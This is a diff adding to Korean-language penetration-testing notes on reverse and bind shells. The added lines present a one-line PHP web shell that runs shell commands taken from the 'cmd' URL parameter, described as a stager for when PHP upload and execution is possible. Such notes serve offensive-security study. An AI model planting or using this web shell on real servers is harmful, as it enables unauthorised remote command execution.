@@ -459,3 +459,11 @@ system user 혹은 admin 계정으로서 실행되는 shell 을 윈도우에서 
 결국에는 reverse/bind shell 이 rce 를 위해 필수적인 방법이지만 이는 결코 fully featured native shell 이 될 수 없기 때문에 이를 통해 
 일반적인 방법으로 해당 머신에 접근할 수 있도록 하는 escalation 으로서 사용되어야함. 
 
+
+
+
+php upload and execute 이 가능한 경우에 아래와 같은 간단한 payload 를 사용할 수 있다. stager 인 셈. 
+
+```
+ <?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
+```
